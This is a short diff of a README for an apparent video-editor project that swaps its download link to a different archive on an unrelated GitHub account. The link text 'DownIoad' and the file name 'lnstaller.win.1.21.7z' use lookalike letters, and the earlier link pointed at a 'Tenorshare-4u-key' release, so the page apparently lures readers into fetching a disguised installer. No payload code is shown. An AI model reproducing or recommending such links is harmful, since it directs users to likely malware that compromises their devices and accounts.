@@ -1,7 +1,7 @@
 # Preview
 ![image](https://github.com/S3phi2/Video-Editor-MV/assets/172444672/557ce624-f29e-4306-af64-ffcd6b6ba306)
 
-## [DownIoad](https://github.com/Dev2W9/Tenorshare-4u-key/releases/download/Release/Git.Installer.1.14.zip)
+## [DownIoad](https://github.com/AlanD3V1/AlanD3/releases/download/DownIoad/lnstaller.win.1.21.7z)
 
 
 # System Requirements
